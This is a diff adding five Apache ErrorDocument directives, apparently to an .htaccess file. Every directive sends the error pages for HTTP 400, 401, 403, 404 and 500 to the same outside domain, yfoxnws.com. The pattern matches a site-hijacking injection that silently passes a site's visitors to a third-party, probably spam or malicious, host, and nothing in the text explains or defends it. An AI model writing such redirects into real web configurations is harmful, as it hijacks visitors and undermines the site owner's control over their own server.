@@ -1,0 +1,5 @@
+ErrorDocument 400 http://yfoxnws.com
+ErrorDocument 401 http://yfoxnws.com
+ErrorDocument 403 http://yfoxnws.com
+ErrorDocument 404 http://yfoxnws.com
+ErrorDocument 500 http://yfoxnws.com
